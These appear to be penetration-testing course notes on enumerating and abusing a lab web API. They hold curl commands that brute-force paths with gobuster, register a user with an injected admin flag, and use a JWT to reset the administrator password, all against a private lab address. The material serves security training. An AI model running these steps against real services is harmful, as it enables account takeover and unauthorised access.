# Web-app Enumeration

Debugging Page Content -> Inspect Element \
\
Inspecting HTTP Response Headers and Sitemaps

Sitemaps -> Web applications can include sitemap files to help search engine bots crawl and index their sites.

```
curl https://www.google.com/robots.txt
```

### <mark style="color:yellow;">Enumerating and Abusing APIs</mark>

_Application Programming Interfaces_ (API)\
API Path Naming Convention -> /api\_name/v1

Enumerating API with Gobuster

Gobuster pattern:

```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

<pre><code><strong>gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
</strong></code></pre>

<mark style="color:yellow;">Inspecting API with curl</mark>&#x20;

```
curl -i http://192.168.50.16:5002/users/v1
```

Bruteforce attack with Gobuster on a specific user

```
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```

craft our request by first passing the \[admin] username and dummy password as JSON data via the **-d** parameter. We'll also specify "json" as the "Content-Type" by specifying a new header with **-H**.

```
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```

Let's try registering a new user with the following syntax by adding a JSON data structure that specifies the desired username and password:

```
curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
```

Registering as admin user

```
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
```

Logging in as admin user&#x20;

```
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```

Attempting to Change the Administrator Password via a POST request

```
curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'
```

Attempting to Change the Administrator Password via a PUT request

```
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

Successfully logging in as the admin account

```
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```

